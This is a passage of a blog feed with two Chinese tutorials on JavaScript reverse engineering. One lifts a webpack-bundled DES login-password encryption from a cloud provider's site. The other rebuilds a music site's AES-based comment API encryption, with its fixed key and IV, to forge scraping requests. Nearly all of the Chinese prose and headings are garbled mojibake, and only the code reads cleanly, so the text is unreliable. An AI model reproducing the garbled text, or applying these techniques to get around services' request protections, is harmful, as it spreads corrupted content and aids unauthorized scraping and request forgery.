alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071629502.png" alt="img"> </p><h2 id="4-åŠ å¯†å‡½æ•°åˆ†æ"><a href="#4-åŠ å¯†å‡½æ•°åˆ†æ" class="headerlink" title="4. åŠ å¯†å‡½æ•°åˆ†æ"></a>4. åŠ å¯†å‡½æ•°åˆ†æ</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071630272.png" alt="img"> </p><h3 id="1ï¼‰æ ¹æ®ä»£ç å¯ä»¥åˆæ­¥åˆ¤æ–­ä¸ºDESåŠ å¯†ï¼š"><a href="#1ï¼‰æ ¹æ®ä»£ç å¯ä»¥åˆæ­¥åˆ¤æ–­ä¸ºDESåŠ å¯†ï¼š" class="headerlink" title="1ï¼‰æ ¹æ®ä»£ç å¯ä»¥åˆæ­¥åˆ¤æ–­ä¸ºDESåŠ å¯†ï¼š"></a>1ï¼‰æ ¹æ®ä»£ç å¯ä»¥åˆæ­¥åˆ¤æ–­ä¸ºDESåŠ å¯†ï¼š</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071631831.png" alt="img"> </p><p>åˆ†æä»£ç é€»è¾‘ï¼š</p><ul><li>åªä¼ å…¥äº†ä¸€ä¸ªå‚æ•°ï¼šå¯†ç å­—æ®µ</li><li>å‰é¢éƒ½æ˜¯varå®šä¹‰å±€éƒ¨å˜é‡</li><li>å…³é”®åŠ å¯†ä»£ç ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l = p.a.TripleDES.encrypt(e, d, s);</span><br></pre></td></tr></table></figure><p>è¿™å—ç›¸å½“äºå¯¹è±¡ä¸€æ­¥æ­¥è°ƒç”¨æ–¹æ³•ï¼Œæ‰€ä»¥ï¼Œè¿™å—è¦å…ˆå®šä½åˆ°å¯¹è±¡ â€œpâ€</p><h3 id="2ï¼‰å‘ä¸Šæ‰¾ï¼Œå®šä½åˆ°å¯¹è±¡p"><a href="#2ï¼‰å‘ä¸Šæ‰¾ï¼Œå®šä½åˆ°å¯¹è±¡p" class="headerlink" title="2ï¼‰å‘ä¸Šæ‰¾ï¼Œå®šä½åˆ°å¯¹è±¡p"></a>2ï¼‰å‘ä¸Šæ‰¾ï¼Œå®šä½åˆ°å¯¹è±¡p</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l = t(&quot;3452&quot;)</span><br><span class="line">p = t.n(l)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071632338.png" alt="img"> </p><p>è¿™å—å¯ä»¥æ˜æ˜¾çœ‹åˆ°å°±æ˜¯ç›¸å½“äºwebpackçš„æ–¹å¼ï¼Œæ¨¡å—åŒ–è°ƒç”¨</p><h3 id="3ï¼‰å°†å½“å‰çš„æ•´ä¸ªä»£ç å¤åˆ¶ä¸‹æ¥æ”¾åˆ°notepad-ä¸­"><a href="#3ï¼‰å°†å½“å‰çš„æ•´ä¸ªä»£ç å¤åˆ¶ä¸‹æ¥æ”¾åˆ°notepad-ä¸­" class="headerlink" title="3ï¼‰å°†å½“å‰çš„æ•´ä¸ªä»£ç å¤åˆ¶ä¸‹æ¥æ”¾åˆ°notepad++ä¸­"></a>3ï¼‰å°†å½“å‰çš„æ•´ä¸ªä»£ç å¤åˆ¶ä¸‹æ¥æ”¾åˆ°notepad++ä¸­</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071632355.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071632854.png" alt="img"> </p><h3 id="4ï¼‰æ‰¾åˆ°webpackä»£ç çš„åˆ†å‘å™¨ï¼ˆåŠ è½½å™¨ï¼‰"><a href="#4ï¼‰æ‰¾åˆ°webpackä»£ç çš„åˆ†å‘å™¨ï¼ˆåŠ è½½å™¨ï¼‰" class="headerlink" title="4ï¼‰æ‰¾åˆ°webpackä»£ç çš„åˆ†å‘å™¨ï¼ˆåŠ è½½å™¨ï¼‰"></a>4ï¼‰æ‰¾åˆ°webpackä»£ç çš„åˆ†å‘å™¨ï¼ˆåŠ è½½å™¨ï¼‰</h3><p>åˆ·æ–°é¡µé¢ï¼Œåœ¨åˆšåˆšæ‰“çš„æ–­ç‚¹på¤„åœä¸‹<br>l &#x3D; t(â€œ3452â€) ä¸­åŠ è½½äº†ç”¨çš„åŠ è§£å¯†ç®—æ³•ï¼Œæˆ‘ä»¬ï¼Œéœ€è¦çš„å°±æ˜¯DESçš„åŠ å¯†å’Œè§£å¯†ç®—æ³•</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071633160.png" alt="img"> </p><p>æ‰€ä»¥ï¼Œæ¥ä¸‹æ¥å®šä½åˆ° â€œ<strong>t</strong>â€œ ï¼Œtå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„åˆ†å‘å™¨ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071633295.png" alt="img"> </p><p>ç®€å•æ”¹å†™ä¸€ä¸‹åˆ†å‘å™¨ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fff</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">u</span>(<span class="params">n</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (r[n])</span><br><span class="line">            <span class="keyword">return</span> r[n].<span class="property">exports</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;--&gt;&#x27;</span>,n)</span><br><span class="line">        <span class="keyword">var</span> t = r[n] = &#123;</span><br><span class="line">            <span class="attr">i</span>: n,</span><br><span class="line">            <span class="attr">l</span>: !<span class="number">1</span>,</span><br><span class="line">            <span class="attr">exports</span>: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> e[n].<span class="title function_">call</span>(t.<span class="property">exports</span>, t, t.<span class="property">exports</span>, u),</span><br><span class="line">        t.<span class="property">l</span> = !<span class="number">0</span>,</span><br><span class="line">        t.<span class="property">exports</span></span><br><span class="line">    &#125;</span><br><span class="line">    fff = u</span><br><span class="line">&#125;(&#123;</span><br><span class="line">   <span class="comment">//æ¨¡å—åŒ–ä»£ç å¡«å……</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="5ï¼‰åŠ å¯†æ¨¡å—ä¸ºâ€3452â€ï¼Œä½†æ˜¯å½“å‰æ‰£å–åˆ°notepad-ä¸­çš„ä»£ç æ²¡æœ‰-3452-æ¨¡å—"><a href="#5ï¼‰åŠ å¯†æ¨¡å—ä¸ºâ€3452â€ï¼Œä½†æ˜¯å½“å‰æ‰£å–åˆ°notepad-ä¸­çš„ä»£ç æ²¡æœ‰-3452-æ¨¡å—" class="headerlink" title="5ï¼‰åŠ å¯†æ¨¡å—ä¸ºâ€3452â€ï¼Œä½†æ˜¯å½“å‰æ‰£å–åˆ°notepad++ä¸­çš„ä»£ç æ²¡æœ‰ 3452 æ¨¡å—"></a>5ï¼‰åŠ å¯†æ¨¡å—ä¸ºâ€3452â€ï¼Œä½†æ˜¯å½“å‰æ‰£å–åˆ°notepad++ä¸­çš„ä»£ç æ²¡æœ‰ 3452 æ¨¡å—</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637070.png" alt="img"> </p><p>å…¨å±€æŸ¥æ‰¾ï¼Œå®šä½åˆ° â€œ3452â€ æ¨¡å—ä»£ç ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637902.png" alt="img"> </p><h3 id="6ï¼‰æ‰£å–åŠ å¯†æ¨¡å—ä»£ç "><a href="#6ï¼‰æ‰£å–åŠ å¯†æ¨¡å—ä»£ç " class="headerlink" title="6ï¼‰æ‰£å–åŠ å¯†æ¨¡å—ä»£ç "></a>6ï¼‰æ‰£å–åŠ å¯†æ¨¡å—ä»£ç </h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637205.png" alt="img"> </p><p>å°†æ¨¡å—ä»£ç æ‰£å–å‡ºæ¥ã€‚æ”¾åˆ°åˆšåˆšå…¶å‰ä¸€æ­¥åšå¥½çš„åŠ è½½å™¨ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä»&quot;00bb&quot;å¼€å§‹ï¼Œæ‰£å–å…¨éƒ¨æ¨¡å—ä»£ç </span><br><span class="line"></span><br><span class="line">çœç•¥ã€‚ã€‚ã€‚</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071637596.png" alt="img"> </p><h3 id="7ï¼‰ç¼–å†™åŠ å¯†å‡½æ•°"><a href="#7ï¼‰ç¼–å†™åŠ å¯†å‡½æ•°" class="headerlink" title="7ï¼‰ç¼–å†™åŠ å¯†å‡½æ•°"></a>7ï¼‰ç¼–å†™åŠ å¯†å‡½æ•°</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ„å»ºåŠ å¯†å‡½æ•°</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="title function_">fff</span>(<span class="string">&#x27;3452&#x27;</span>);   <span class="comment">//å®šä¹‰å¯¼å‡ºå‡½æ•°ï¼Œå°†åŠ å¯†æ¨¡å—å¯¼å‡ºä¸ºå…¨å±€å˜é‡p</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getUsername</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="comment">//ç”¨æˆ·åé•¿åº¦ä¸å¤Ÿæœ«å°¾è‡ªåŠ¨è¡¥é›¶</span></span><br><span class="line">   <span class="keyword">var</span> n = <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">1</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="variable language_">arguments</span>[<span class="number">1</span>] ? <span class="variable language_">arguments</span>[<span class="number">1</span>] : &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (e &amp;&amp; <span class="string">&quot;string&quot;</span> === <span class="keyword">typeof</span> e) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = n.<span class="property">text</span> || <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            r = n.<span class="property">length</span> || <span class="number">24</span>;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">length</span> &lt; r) </span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> a = e.<span class="property">length</span>; a &lt; r; a++)</span><br><span class="line">            e += t;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">          e = e.<span class="title function_">substring</span>(<span class="number">0</span>, r);</span><br><span class="line">      <span class="comment">//å»é™¤ç”¨æˆ·åä¸­çš„ç©ºæ ¼</span></span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getPwd</span>(<span class="params">pwd,name</span>)&#123;</span><br><span class="line">  <span class="comment">//æ„å»ºåŠ å¯†å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//å¯¼å‡ºåŠ å¯†på¯¹è±¡</span></span><br><span class="line">  <span class="keyword">var</span> n = <span class="title function_">getUsername</span>(name)</span><br><span class="line">  , c = pwd</span><br><span class="line">  , d = p.<span class="property">enc</span>[<span class="string">&#x27;utf-8&#x27;</span>].<span class="title function_">parse</span>(n)</span><br><span class="line">  , l = &#123;</span><br><span class="line">    <span class="attr">mode</span>: p.<span class="property">mode</span>[<span class="string">&#x27;ECB&#x27;</span>],</span><br><span class="line">    <span class="attr">padding</span>: p.<span class="property">pad</span>[<span class="string">&#x27;pkcs7&#x27;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">  , s = p.<span class="property">DES</span>.<span class="title function_">encrypt</span>(c, d, l);</span><br><span class="line">  <span class="keyword">return</span> s.<span class="title function_">toString</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8ï¼‰æ±‡æ€»ä¸€ä¸‹ä»£ç "><a href="#8ï¼‰æ±‡æ€»ä¸€ä¸‹ä»£ç " class="headerlink" title="8ï¼‰æ±‡æ€»ä¸€ä¸‹ä»£ç "></a>8ï¼‰<strong>æ±‡æ€»ä¸€ä¸‹ä»£ç </strong></h3><p>å‚è€ƒåé¢ç¬¬å››éƒ¨åˆ†ï¼Œå®Œæ•´ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ†å‘å™¨ä»£ç +åŠ å¯†æ¨¡å—ä»£ç +è‡ªå†™åŠ å¯†å‡½æ•°ä»£ç </span><br></pre></td></tr></table></figure><h3 id="9ï¼‰æµ‹è¯•"><a href="#9ï¼‰æµ‹è¯•" class="headerlink" title="9ï¼‰æµ‹è¯•"></a>9ï¼‰æµ‹è¯•</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071639873.png" alt="img"> </p><h1 id="ä»£ç ç¼–å†™"><a href="#ä»£ç ç¼–å†™" class="headerlink" title="ä»£ç ç¼–å†™"></a>ä»£ç ç¼–å†™</h1><h2 id="1-ç¬¬äºŒä¸ªå‚æ•°ä»£ç "><a href="#1-ç¬¬äºŒä¸ªå‚æ•°ä»£ç " class="headerlink" title="1. ç¬¬äºŒä¸ªå‚æ•°ä»£ç "></a>1. ç¬¬äºŒä¸ªå‚æ•°ä»£ç </h2><p>ä½œç”¨ï¼šå¤„ç†ç”¨æˆ·åï¼ˆä½¿ç”¨æ­£åˆ™æ›¿æ¢ç”¨æˆ·åä¸­çš„ä»»ä½•ç©ºç™½å­—ç¬¦ã€åŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‘ä¸ºç©ºï¼Œç„¶åå°†ç”¨æˆ·åçš„é•¿åº¦ä½¿ç”¨ â€œ0â€ å¡«å……ä¸º 24ä½ï¼‰</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Q = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="variable language_">arguments</span>[<span class="number">0</span>] ? <span class="variable language_">arguments</span>[<span class="number">0</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">F = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> n = <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">1</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="variable language_">arguments</span>[<span class="number">1</span>] ? <span class="variable language_">arguments</span>[<span class="number">1</span>] : &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (e &amp;&amp; <span class="string">&quot;string&quot;</span> === <span class="keyword">typeof</span> e) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = n.<span class="property">text</span> || <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            r = n.<span class="property">length</span> || <span class="number">24</span>;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">length</span> &lt; r) <span class="keyword">for</span> (<span class="keyword">var</span> a = e.<span class="property">length</span>; a &lt; r; a++)</span><br><span class="line">        e += t;</span><br><span class="line">        <span class="keyword">else</span> e = e.<span class="title function_">substring</span>(<span class="number">0</span>, r);</span><br><span class="line">        <span class="keyword">return</span> e</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071640006.png" alt="img"> </p><h2 id="2-å®Œæ•´JSä»£ç "><a href="#2-å®Œæ•´JSä»£ç " class="headerlink" title="2. å®Œæ•´JSä»£ç "></a>2. å®Œæ•´JSä»£ç </h2><p>ä»£ç å¤ªå¤šäº†ï¼Œæ’å…¥é™„ä»¶å‚è€ƒ</p><p><a href="https://gitee.com/jingweihang/img/blob/master/hexo/202405/m.ctyun.cn.js">hexo&#x2F;202405&#x2F;m.ctyun.cn.js Â· è¦ä¼˜ç§€&#x2F;img - Gitee.com</a></p>]]></content>
      
      
      <categories>
          
          <category> JSé€†å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSé€†å‘ </tag>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŸmusicéŸ³ä¹è¯„è®ºè§£å¯†</title>
      <link href="/2024/05/07/%E6%9F%90music%E9%9F%B3%E4%B9%90%E8%AF%84%E8%AE%BA%E8%A7%A3%E5%AF%86/"/>
      <url>/2024/05/07/%E6%9F%90music%E9%9F%B3%E4%B9%90%E8%AF%84%E8%AE%BA%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="å¸¸è§„åˆ†æ"><a href="#å¸¸è§„åˆ†æ" class="headerlink" title="å¸¸è§„åˆ†æ"></a>å¸¸è§„åˆ†æ</h1><p>è¿™å—å¾ˆå¤šæ­¥éª¤å‚è€ƒåŸä½œè€…æ–‡ç« ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p><p><a href="https://mp.weixin.qq.com/s/loXsmR8uhrtFA_3EuBQB8w">https://mp.weixin.qq.com/s/loXsmR8uhrtFA_3EuBQB8w</a></p><h2 id="ç›®æ ‡åœ°å€"><a href="#ç›®æ ‡åœ°å€" class="headerlink" title="ç›®æ ‡åœ°å€"></a>ç›®æ ‡åœ°å€</h2><p>aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvc29uZz9pZD0yMDYxOTc4OTYx</p><h2 id="åˆ†ææ•°æ®åŒ…"><a href="#åˆ†ææ•°æ®åŒ…" class="headerlink" title="åˆ†ææ•°æ®åŒ…"></a>åˆ†ææ•°æ®åŒ…</h2><p>1ã€è·å–è¯„è®ºæ¥å£ä¸º<a href="https://music.163.com/weapi/comment/resource/comments/get?csrf_token=">https://music.163.com/weapi/comment/resource/comments/get?csrf_token=</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405070950955.png" alt="image.png"> </p><p>2ã€POSTè¯·æ±‚ï¼Œé‡Œé¢æœ‰ä¸¤ä¸ªå‚æ•° â€œ<strong>params</strong>â€œå’Œâ€<strong>encSecKey</strong>â€œ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071105575.png" alt="image.png"> </p><p>å°è¯•å¤šæ¬¡è¯·æ±‚ï¼Œå‘ç°è¿™ä¸¤ä¸ªå‚æ•°å€¼æ˜¯ä¸€ç›´å˜åŒ–çš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071106618.png" alt="image.png"> </p><h2 id="åˆ†æå‚æ•°"><a href="#åˆ†æå‚æ•°" class="headerlink" title="åˆ†æå‚æ•°"></a>åˆ†æå‚æ•°</h2><p>æŒ‰ç…§ä»¥å¾€çš„æŠ“å–ç»éªŒæ¥è¯´ï¼Œå®ƒä»¬å¤§æ¦‚ç‡æ˜¯åœ¨ä¸€èµ·çš„ï¼Œå› æ­¤å¯ä»¥é€šè¿‡å…¨å±€æœç´¢<strong>encSecKey</strong>è¿™ä¸ªè¯æ±‡ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071106426.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var bKL9C = window.asrsea(JSON.stringify(i6c), bvl1x([&quot;æµæ³ª&quot;, &quot;å¼º&quot;]), bvl1x(Rj5o.md), bvl1x([&quot;çˆ±å¿ƒ&quot;, &quot;å¥³å­©&quot;, &quot;æƒŠæ&quot;, &quot;å¤§ç¬‘&quot;]));</span><br><span class="line">e6c.data = j6d.cq6k(&#123;</span><br><span class="line">  params: bKL9C.encText,</span><br><span class="line">  encSecKey: bKL9C.encSecKey</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>æ‰“æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071107423.png" alt="fae1bc4fedfcd635849bfcf0d8c47326.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071107384.png" alt="d296bd02b2adf2c40ac2011ddc78fd5a.png"> </p><p>æˆåŠŸå®šä½åˆ°å‚æ•°çš„å…·ä½“ä½ç½®ã€‚ã€‚ã€‚</p><h2 id="å¯»æ‰¾åŠ å¯†å‡½æ•°"><a href="#å¯»æ‰¾åŠ å¯†å‡½æ•°" class="headerlink" title="å¯»æ‰¾åŠ å¯†å‡½æ•°"></a>å¯»æ‰¾åŠ å¯†å‡½æ•°</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var bKL9C = window.asrsea(JSON.stringify(i6c), bvl1x([&quot;æµæ³ª&quot;, &quot;å¼º&quot;]), bvl1x(Rj5o.md), bvl1x([&quot;çˆ±å¿ƒ&quot;, &quot;å¥³å­©&quot;, &quot;æƒŠæ&quot;, &quot;å¤§ç¬‘&quot;]));</span><br><span class="line">e6c.data = j6d.cq6k(&#123;</span><br><span class="line">  params: bKL9C.encText,</span><br><span class="line">  encSecKey: bKL9C.encSecKey</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>åŠ å¯†å‡½æ•°åº”è¯¥å°±æ˜¯asrseaï¼Œåœ¨é‡Œé¢ä¸€å…±è¦ä¼ é€’å››ä¸ªå‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥çœ‹çœ‹è¿™å››ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>ç‚¹å‡»ç¿»é¡µï¼Œç„¶åæ–­ç‚¹ä¸‹æ¥åæŸ¥çœ‹å‚æ•°å€¼ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071108857.png" alt="img"> </p><p>ç”±ä¸Šå›¾å¯ä»¥å‘ç°ï¼Œè¿™å››ä¸ªå‚æ•°ä¸­ï¼Œåˆ†åˆ«æ‰¾äº†ä¸¤ä¸ªæ•°æ®åŒ…æ¥åˆ¤æ–­ï¼Œå®ƒä»¬ä¼šä¸ä¼šæœ‰ä»€ä¹ˆå˜åŒ–ï¼Œå˜åŒ–çš„å€¼æ˜¯<strong>pageNoã€‚</strong></p><p>å½“ç„¶äº†ï¼Œè¿™é‡Œé™¤äº†pageNoä¹‹å¤–ï¼Œè¿˜æœ‰cursorä¹Ÿæ˜¯å˜åŒ–çš„ï¼Œå®ƒä»£è¡¨çš„æ˜¯æ—¶é—´æˆ³ã€‚</p><p>æ„å‘³ç€å³ä½¿æ˜¯ç›¸åŒçš„é¡µé¢<strong>params</strong>å’Œ<strong>encSecKey</strong>çš„å€¼ä¹Ÿæ˜¯æ—¶æ—¶åˆ»åˆ»éƒ½åœ¨å‘ç”Ÿå˜åŒ–çš„ã€‚</p><h2 id="è¿›å…¥åŠ å¯†å‡½æ•°"><a href="#è¿›å…¥åŠ å¯†å‡½æ•°" class="headerlink" title="è¿›å…¥åŠ å¯†å‡½æ•°"></a>è¿›å…¥åŠ å¯†å‡½æ•°</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071109485.png" alt="img"> </p><p>è¿›æ¥ä¹‹åï¼Œå‡½æ•°å¥—å‡½æ•°ï¼Œå¼€å§‹è¡¥å…¨jsä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function d(d, e, f, g) &#123;</span><br><span class="line">        var h = &#123;&#125;</span><br><span class="line">          , i = a(16);</span><br><span class="line">        return h.encText = b(d, g),</span><br><span class="line">        h.encText = b(h.encText, i),</span><br><span class="line">        h.encSecKey = c(i, e, f),</span><br><span class="line">        h</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071109254.png" alt="image.png"> </p><p>é‡Œé¢åŒ…å«äº†</p><ul><li>å‡½æ•°a</li><li>å‡½æ•°b</li><li>å‡½æ•°c</li></ul><h3 id="å‡½æ•°a"><a href="#å‡½æ•°a" class="headerlink" title="å‡½æ•°a"></a>å‡½æ•°a</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function a(a) &#123;</span><br><span class="line">        var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span><br><span class="line">        for (d = 0; a &gt; d; d += 1)</span><br><span class="line">            e = Math.random() * b.length,</span><br><span class="line">            e = Math.floor(e),</span><br><span class="line">            c += b.charAt(e);</span><br><span class="line">        return c</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¸éš¾çœ‹å‡ºï¼Œ<strong>å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯ç”Ÿæˆ16ä½éšæœºå­—ç¬¦</strong></p><p>ç®€å•åšä¸ªä¿®æ”¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function a(length)&#123;</span><br><span class="line">    let d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span><br><span class="line">    for (d = 0; length &gt; d; d += 1)&#123;</span><br><span class="line">        e = Math.random() * b.length;</span><br><span class="line">        e = Math.floor(e);</span><br><span class="line">        c += b.charAt(e);</span><br><span class="line">    &#125;</span><br><span class="line">    return c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let result = a(16);</span><br></pre></td></tr></table></figure><h3 id="å‡½æ•°b"><a href="#å‡½æ•°b" class="headerlink" title="å‡½æ•°b"></a>å‡½æ•°b</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function b(a, b) &#123;</span><br><span class="line">        var c = CryptoJS.enc.Utf8.parse(b)</span><br><span class="line">          , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;)</span><br><span class="line">          , e = CryptoJS.enc.Utf8.parse(a)</span><br><span class="line">          , f = CryptoJS.AES.encrypt(e, c, &#123;</span><br><span class="line">            iv: d,</span><br><span class="line">            mode: CryptoJS.mode.CBC</span><br><span class="line">        &#125;);</span><br><span class="line">        return f.toString()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œå°±æ¥è§£é‡Šä¸€ä¸‹ï¼Œè¿™æ®µä»£ç çš„æ„æ€ã€‚</p><p>aä»£è¡¨çš„æ˜¯ä½ è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œbä»£è¡¨å¯†é’¥ã€‚å®ƒçš„åŸºæœ¬ä½œç”¨æ˜¯åˆ©ç”¨AESåŠ å¯†ç®—æ³•é…åˆCBCæ¨¡å¼çš„åŠ å¯†è¿‡ç¨‹ï¼Œæœ€åä»¥base64çš„å½¢å¼è¾“å‡º</p><p>ç®€å•ä¿®æ”¹ä¸€ä¸‹ï¼Œä¸Šè¿°ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function generateRandomString(length)&#123;</span><br><span class="line">    let d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;;</span><br><span class="line">    for (d = 0; length &gt; d; d += 1)&#123;</span><br><span class="line">        e = Math.random() * b.length;</span><br><span class="line">        e = Math.floor(e);</span><br><span class="line">        c += b.charAt(e);</span><br><span class="line">    &#125;</span><br><span class="line">    return c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// è·å–AESåŠ å¯†æ•°æ®</span><br><span class="line">const CryptoJS = require(&quot;crypto-js&quot;)</span><br><span class="line">function encryptMessage(message, key) &#123;</span><br><span class="line">    let keyUtf8 = CryptoJS.enc.Utf8.parse(key);</span><br><span class="line">    let iv = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;);</span><br><span class="line">    let messageUtf8 = CryptoJS.enc.Utf8.parse(message);</span><br><span class="line">    let encrypted = CryptoJS.AES.encrypt(messageUtf8, keyUtf8, &#123;</span><br><span class="line">        iv: iv,</span><br><span class="line">        mode: CryptoJS.mode.CBC&#125;);</span><br><span class="line">    return encrypted.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let message = &#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;3&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1708238561030&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;;</span><br><span class="line">let key = generateRandomString(16);</span><br><span class="line">let encrypyResult = encryptMessage(message, &quot;0CoJUm6Qyw8W8jud&quot;)</span><br><span class="line">// console.log(encrypyResult)</span><br><span class="line">let encText = encryptMessage(encrypyResult, key)</span><br><span class="line">console.log(encText)</span><br></pre></td></tr></table></figure><h3 